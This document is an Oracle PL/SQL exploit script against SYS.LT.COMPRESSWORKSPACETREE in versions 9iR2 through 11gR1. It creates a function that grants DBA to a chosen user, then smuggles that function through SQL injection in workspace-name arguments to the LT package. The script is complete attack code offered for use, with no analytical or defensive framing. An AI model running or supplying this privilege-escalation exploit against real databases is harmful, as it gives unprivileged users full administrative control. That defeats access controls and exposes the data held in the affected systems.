-- 
-- sys-lt-compressworkspacetree.sql
--
--
-- Oracle SYS.LT.COMPRESSWORKSPACETREE exploit (9iR2/10gR1,10gR2,11gR1)
--
-- Grant dba permission to unprivileged user
-- 
-- 
--   REF:    http://www.google.it/search?q=SYS.LT.COMPRESSWORKSPACETREE
--   
--   AUTHOR: Andrea "bunker" Purificato
--           http://rawlab.mindcreations.com
--
--
set serveroutput on;
prompt [+] sys-lt-compressworkspacetree.sql exploit
prompt [+] by Andrea "bunker" Purificato - http://rawlab.mindcreations.com
prompt [+] 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
prompt 
undefine the_user;
accept the_user char prompt 'Target username (default TEST): ' default 'TEST';
prompt
prompt [-] Building evil function...

CREATE OR REPLACE FUNCTION OWN RETURN NUMBER 
 AUTHID CURRENT_USER AS 
 PRAGMA AUTONOMOUS_TRANSACTION; 
BEGIN
 EXECUTE IMMEDIATE 'GRANT DBA TO &the_user'; COMMIT; 
 RETURN(0);
END;
/

prompt [-] Finishing...

EXEC SYS.LT.CREATEWORKSPACE('x''||'||user||'.own||''--'); 
EXEC SYS.LT.COMPRESSWORKSPACETREE('x''||'||user||'.own||''--');

prompt [-] YOU GOT THE POWAH!!
